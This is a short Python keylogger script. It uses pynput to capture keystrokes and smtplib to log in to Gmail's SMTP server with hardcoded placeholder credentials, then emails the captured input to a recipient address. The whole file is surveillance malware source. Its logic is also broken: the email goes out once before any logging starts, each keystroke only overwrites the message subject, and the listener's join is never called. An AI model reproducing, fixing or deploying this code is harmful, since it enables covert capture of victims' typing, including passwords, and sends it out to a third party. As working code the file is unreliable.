import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Listener

your_email = "your_email@example.com"
your_password = "password123"
recipient_email = "recipient@example.com"
msg = MIMEMultipart()

try:
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(your_email, your_password)
    
    # Send email
    server.send_message(msg)
    print("Email sent successfully!")
    
    server.close()
except Exception as e:
    print(f"Error sending email: {e}")

def key_stroke(key):
    key = str(key).replace('\'', '')
    
    msg['From'] = your_email
    msg['To'] = recipient_email
    msg['Subject'] = key + '\n'

def start_logging():
    with Listener(on_press=key_stroke) as listener:
        listener.join

if __name__ == "__main__":
    start_logging()